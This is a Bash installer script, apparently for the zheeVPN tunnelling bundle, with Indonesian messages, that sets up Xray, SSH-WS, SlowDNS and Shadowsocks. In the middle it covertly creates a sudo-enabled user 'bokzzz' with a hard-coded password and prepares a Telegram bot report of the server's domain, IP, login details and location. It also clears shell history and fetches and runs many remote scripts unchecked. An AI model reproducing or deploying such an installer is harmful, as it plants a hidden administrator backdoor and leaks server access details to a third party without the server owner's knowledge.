#!/bin/bash

dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
clear
red='\e[1;31m'
green='\e[0;32m'
yell='\e[1;33m'
tyblue='\e[1;36m'
NC='\e[0m'
YELLOW="\033[1;33m"
purple() { echo -e "\\033[35;1m${*}\\033[0m"; }
tyblue() { echo -e "\\033[36;1m${*}\\033[0m"; }
yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
green() { echo -e "\\033[32;1m${*}\\033[0m"; }
red() { echo -e "\\033[31;1m${*}\\033[0m"; }
# domain random
CDN="https://raw.githubusercontent.com/zheevpn/v1/main/ssh"
cd /root
if [ "${EUID}" -ne 0 ]; then
echo "You need to run this script as root"
exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
echo "OpenVZ is not supported"
exit 1
fi
localip=$(hostname -I | cut -d\  -f1)
hst=( `hostname` )
dart=$(cat /etc/hosts | grep -w `hostname` | awk '{print $2}')
if [[ "$hst" != "$dart" ]]; then
echo "$localip $(hostname)" >> /etc/hosts
fi
mkdir -p /etc/xray
mkdir -p /etc/v2ray
touch /etc/xray/domain
touch /etc/v2ray/domain
touch /etc/xray/scdomain
touch /etc/v2ray/scdomain
echo -e "[ ${tyblue}NOTES${NC} ] Before we go.. "
sleep 1
echo -e "[ ${tyblue}NOTES${NC} ] I need check your headers first.."
sleep 2
echo -e "[ ${green}INFO${NC} ] Checking headers"
sleep 1
totet=`uname -r`
REQUIRED_PKG="linux-headers-$totet"
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG|grep "install ok installed")
echo Checking for $REQUIRED_PKG: $PKG_OK
if [ "" = "$PKG_OK" ]; then
sleep 2
echo -e "[ ${yell}WARNING${NC} ] Try to install ...."
echo "No $REQUIRED_PKG. Setting up $REQUIRED_PKG."
apt-get --yes install $REQUIRED_PKG
sleep 1
echo ""
sleep 1
echo -e "[ ${tyblue}NOTES${NC} ] If error you need.. to do this"
sleep 1
echo ""
clear
echo -e "${YELLOW}┌────────────────────────────┐${NC}"
echo -e "[ ${tyblue}NOTES${NC} ] 1. apt update -y"
echo -e "[ ${tyblue}NOTES${NC} ] 2. apt upgrade -y"
echo -e "[ ${tyblue}NOTES${NC} ] 3. apt dist-upgrade -y"
echo -e "[ ${tyblue}NOTES${NC} ] 4. reboot"
echo -e "[ ${tyblue}NOTES${NC} ] 5. 🗿🖕"
echo -e "[ ${tyblue}NOTES${NC} ] 6. Jngn Lupa bersyukur"
echo -e "[ ${tyblue}NOTES${NC} ] 7. After udud"
echo -e "[ ${tyblue}NOTES${NC} ] 8. ${YELLOW} Script By zheeVPN "
echo -e "[ ${tyblue}NOTES${NC} ] 9. Ente Ngerti Kgak Ngerti Klik Enter"
echo -e "${YELLOW}└────────────────────────────┘${NC}"
sleep 3
read
else
echo -e "[ ${green}INFO${NC} ] Oke tod"
fi
ttet=`uname -r`
ReqPKG="linux-headers-$ttet"
if ! dpkg -s $ReqPKG  >/dev/null 2>&1; then
rm /root/setupku.sh >/dev/null 2>&1
exit
else
clear
fi
secs_to_human() {
echo "Installation time : $(( ${1} / 3600 )) hours $(( (${1} / 60) % 60 )) minute's $(( ${1} % 60 )) seconds"
}
start=$(date +%s)
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1
coreselect=''
cat> /root/.profile << END
if [ "$BASH" ]; then
if [ -f ~/.bashrc ]; then
. ~/.bashrc
fi
fi
mesg n || true
clear
END
chmod 644 /root/.profile
echo -e "[ ${green}INFO${NC} ] Preparing the install file"
apt install git curl -y >/dev/null 2>&1
apt install python -y >/dev/null 2>&1
apt install bash -y
clear
clear
echo -e "[ ${green}INFO${NC} ] Aight good ... installation file is ready"
sleep 2
echo -e "$green TERIMAKSIH TELAH MENGGUNAKAN SCRIPT zheeVPN $NC"
sleep 4
echo -ne "[ ${green}INFO${NC} ] Check permission : "
mkdir -p /var/lib/SIJA >/dev/null 2>&1
echo "IP=" >> /var/lib/SIJA/ipvps.conf
echo -e "${green}┌──────────────────────────────────────────┐${NC}"
echo -e "                  ${YELLOW}INSTALL TOOLS${NC}"
echo -e "${green}└──────────────────────────────────────────┘${NC}"
sleep 3
#rm Kontol.sh
wget https://raw.githubusercontent.com/zheevpn/v1/main/system/kontol.sh && chmod +x kontol.sh && ./kontol.sh
clear
echo " "
echo "${green}Anda akan di arahkan ke domain dalam 3 detik${NC}"
sleep 3
clear
echo -e "$green━━━━━━━━━━┏┓━━━━━━━━━━━━━━━━━━━━━━━━┏┓━━━━━━━━━━━$NC"
echo -e "$green━━━━━━━━━┏┛┗┓━━━━━━━━━━━━━━━━━━━━━━┏┛┗┓━━━━━━━━━━$NC"
echo -e "$green┏━━┓━┏┓┏┓┗┓┏┛┏━━┓━━━┏━━┓┏━━┓┏┓┏━┓━┗┓┏┛┏┓┏━┓━┏━━┓$NC"
echo -e "$green┗━┓┃━┃┃┃┃━┃┃━┃┏┓┃━━━━┃┏┓┃┃┏┓┃┣┫┃┏┓┓━┃┃━┣┫┃┏┓┓┃┏┓┃$NC"
echo -e "$green┃┗┛┗┓┃┗┛┃━┃┗┓┃┗┛┃━━━━┃┗┛┃┃┗┛┃┃┃┃┃┃┃━┃┗┓┃┃┃┃┃┃┃┗┛┃$NC"
echo -e "$green┗━━━┛┗━━┛━┗━┛┗━━┛━━━━┃┏━┛┗━━┛┗┛┗┛┗┛━┗━┛┗┛┗┛┗┛┗━┓┃$NC"
echo -e "$green━━━━━━━━━━━━━━━━━━━━━┃┃━━━━━━━━━━━━━━━━━━━━━━┏━┛┃$NC"
echo -e "$green━━━━━━━━━━━━━━━━━━━━━┗┛━━━━━━━━━━━━━━━━━━━━━━┗━━┛$NC"
echo -e "${green}┌─────────────────────────────────────────┐${NC}"
echo -e "               ${YELLOW} 1. DOMAIN RANDOM${NC}"
echo -e "               ${YELLOW} 2. DOMAIN SENDIRI${NC}"
echo -e "${green}└─────────────────────────────────────────┘${NC}"
    read -rp " select [ 1 or 2 ] --- >>>     " dns
	if test $dns -eq 1; then
    clear
    apt install jq curl -y
    wget -q -O /root/cf "${CDN}/cf" >/dev/null 2>&1
    chmod +x /root/cf
    bash /root/cf | tee /root/install.log
    print_success "Domain Random Done"
	elif test $dns -eq 2; then
    read -rp "Enter Your Domain / masukan domain : " dom
    read -rp "Input ur ns-domain : " -e nsdomen
    echo "IP=$dom" > /var/lib/SIJA/ipvps.conf
    echo "$dom" > /root/scdomain
	echo "$dom" > /etc/xray/scdomain
	echo "$dom" > /etc/xray/domain
	echo "$dom" > /etc/v2ray/domain
	echo "$dom" > /root/domain
        echo "$nsdomen" > /etc/xray/nsdomain
        echo "$nsdomen" > /root/nsdomain
fi
domain=$(cat /root/domain)
CITY=$(curl -s ipinfo.io/city )
WKT=$(curl -s ipinfo.io/timezone )
userdel jame > /dev/null 2>&1
Username="bokzzz"
Password=bokzzz
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1
# BOT TELEGRAM BY zheeVPN
CHATID=""
KEY=""
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
TEXT="Installasi Script project By zheeVPN
============================
<code>Domain     :</code> <code>$domain</code>
<code>IP Vps     :</code> <code>$IPVPS</code>
<code>User Login :</code> <code>bok</code>
<code>Pass Login :</code> <code>bok</code>
<code>User Script:</code> <code>$Name</code>
<code>Exp Script :</code> <code>$Exp</code>
<code>Location   :</code> <code>$CITY</code>
<code>Timezone   :</code> <code>$WKT</code>
============================
"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo -e "        ${green}Installing Script...${NC}"
sleep 3
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green      Install SSH / WS               $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget https://raw.githubusercontent.com/zheevpn/v1/main/install.sh && chmod +x install.sh && ./install.sh
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green      Install BACKUP               $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget https://raw.githubusercontent.com/zheevpn/v1/main/backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
clear
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install XRAY              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget https://raw.githubusercontent.com/zheevpn/v1/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
wget https://raw.githubusercontent.com/zheevpn/v1/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install SLOWDNS              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget https://raw.githubusercontent.com/zheevpn/v1/main/system/slow.sh && chmod +x slow.sh && ./slow.sh
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install SHADOWSOCKS              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget https://raw.githubusercontent.com/zheevpn/v1/main/sodosok/sodosok.sh && chmod +x sodosok.sh && ./sodosok.sh
wget https://raw.githubusercontent.com/zheevpn/v1/main/sodosok/ssr.sh && chmod +x ssr.sh && ./ssr.sh
clear
cat> /root/.profile << END
if [ "$BASH" ]; then
if [ -f ~/.bashrc ]; then
. ~/.bashrc
fi
fi
mesg n || true
clear
menu
END
chmod 644 /root/.profile
if [ -f "/root/log-install.txt" ]; then
rm /root/log-install.txt > /dev/null 2>&1
fi
if [ -f "/etc/afak.conf" ]; then
rm /etc/afak.conf > /dev/null 2>&1
fi
if [ ! -f "/etc/log-create-user.log" ]; then
echo "Log All Account " > /etc/log-create-user.log
fi
history -c
serverV=$( curl -sS https://raw.githubusercontent.com/zheevpn/v1/main/version  )
echo $serverV > /opt/.ver
aureb=$(cat /home/re_otm)
b=11
if [ $aureb -gt $b ]
then
gg="PM"
else
gg="AM"
fi
curl -sS ifconfig.me > /etc/myipvps
echo "    ┌─────────────────────────────────────────────────────┐"
    echo "    │   >>> Service & Port"  | tee -a log-install.txt
    echo "    │   - OpenVPN		: 2086"  | tee -a log-install.txt
    echo "    │   - OpenSSH		: 22"  | tee -a log-install.txt
    echo "    │   - SSH Ws Ntls	: 80,8080" | tee -a log-install.txt
    echo "    │   - SSH Ws Tls	: 443" | tee -a log-install.txt
    echo "    │   - Stunnel4		: 8880, 8443" | tee -a log-install.txt
    echo "    │   - Dropbear		: 109, 143" | tee -a log-install.txt
    echo "    │    - Badvpn		: 7100-7900" | tee -a log-install.txt
    echo "    │    - Nginx Ws	   : 81,80,443" | tee -a log-install.txt
    echo "    │   - Vmess TLS		: 443" | tee -a log-install.txt
    echo "    │   - Vmess None TLS	: 80,8080" | tee -a log-install.txt
    echo "    │   - Vless TLS		: 443" | tee -a log-install.txt
    echo "    │   - Vless None TLS	: 80,8080" | tee -a log-install.txt
    echo "    │   - Trojan GRPC		: 443" | tee -a log-install.txt
    echo "    │   - Trojan WS		: 443" | tee -a log-install.txt
    echo "    │   - Trojan Go		: 443" | tee -a log-install.txt
    echo "    │"  | tee -a log-install.txt
    echo "    │   >>> Server Information & Other Features"  | tee -a log-install.txt
    echo "    │   - Timezone		: Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
    echo "    │   - Fail2Ban		: "  | tee -a log-install.txt
    echo "    │   - Dflate		: "  | tee -a log-install.txt
    echo "    │   - IPtables		: "  | tee -a log-install.txt
    echo "    │   - Auto-Reboot		: "  | tee -a log-install.txt
    echo "    │   - IPv6			: [OFF]"  | tee -a log-install.txt
    echo "    │   - Autoreboot On	: $aureb:00 $gg GMT +7" | tee -a log-install.txt
    echo "    │   - AutoKill Multi Login User" | tee -a log-install.txt
    echo "    │   - Auto Delete Expired Account" | tee -a log-install.txt
    echo "    │   - Fully automatic script" | tee -a log-install.txt
    echo "    │   - VPS settings" | tee -a log-install.txt
    echo "    │   - Admin Control" | tee -a log-install.txt
    echo "    │   - Change port" | tee -a log-install.txt
    echo "    │   - Full Orders For Various Services" | tee -a log-install.txt
echo "    └─────────────────────────────────────────────────────┘"
echo -e ""
echo ""
echo "" | tee -a log-install.txt
rm /root/setup.sh >/dev/null 2>&1
rm /root/ins-xray.sh >/dev/null 2>&1
rm /root/insshws.sh >/dev/null 2>&1
rm -rf ssh-vpn.sh
rm -rf slow.sh
rm -rf setupku .sh
rm -rf domain
rm -rf insshws.sh
rm -rf installed.sh
secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
echo -e "Installasi Suskes !"
sleep 3
read -p "Klik [ Enter ] Untuk Ke menu"
menu
